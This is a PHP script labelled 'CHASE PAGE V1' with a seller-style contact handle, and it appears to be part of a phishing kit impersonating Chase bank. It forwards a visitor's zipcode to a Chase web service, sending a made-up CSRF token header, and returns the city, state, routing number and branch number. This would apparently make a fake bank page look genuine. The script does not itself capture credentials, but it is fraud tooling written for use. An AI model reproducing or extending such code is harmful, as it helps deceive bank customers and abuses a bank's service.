<?php
error_reporting(E_ALL ^ E_NOTICE);
    /*
    |--------------------------------------------------------------------------
    | CHASE PAGE V1
    |--------------------------------------------------------------------------
    |
    | Contact me : @zroxo
    |
    */
function get_string_between($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}

if (isset($_POST['zipcode'])) {
$zipcode = $_POST['zipcode'];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://secure03b.chase.com/svc/wr/oao/public/v2/citystate/list');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'zipCode='.$zipcode.'');
$headers = array();
$headers[] = 'X-Jpmc-Csrf-Token: ZROXO';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
curl_close($ch);
if(strpos($result, 'PRICING_REGION_SERVICE_FAILED') !== false){
	echo "invalid";exit();
}elseif(strpos($result, 'city') !== false){
	$city = get_string_between($result, '"city":"', '"');
	$state = get_string_between($result, '"state":"', '"');
	$routingNumber = get_string_between($result, '"routingNumber":"', '"');
	$branchNumber = get_string_between($result, '"branchNumber":"', '"');
	$data = array('city' => $city, 'state' => $state, 'routingNumber' => $routingNumber, 'branchNumber' => $branchNumber);
	echo json_encode($data);exit();
}

}else{
	echo "invalid";exit();
}

?>